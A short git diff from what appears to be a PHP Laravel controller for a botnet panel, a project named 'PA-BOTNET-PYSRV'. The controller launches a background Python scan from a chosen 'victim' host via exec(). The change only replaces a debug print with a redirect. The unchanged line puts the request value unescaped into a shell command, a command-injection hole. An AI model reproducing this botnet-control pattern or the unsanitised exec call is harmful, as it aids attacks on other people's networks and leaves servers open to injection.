@@ -137,6 +137,6 @@ class NetworkController extends Controller
         $command = "nohup bash -c 'source /home/debian/PA-BOTNET-PYSRV/venv/bin/activate && python3 /home/debian/PA-BOTNET-PYSRV/main.py --scan --host $victim_uid > /dev/null 2>&1 &' > /dev/null 2>&1 & echo $!";
         exec($command, $output, $return);
 
-        print_r($command);
+        return redirect("/network/$group_id")->with('output', "Scan lancé depuis : $victim_uid.");
     }
 }
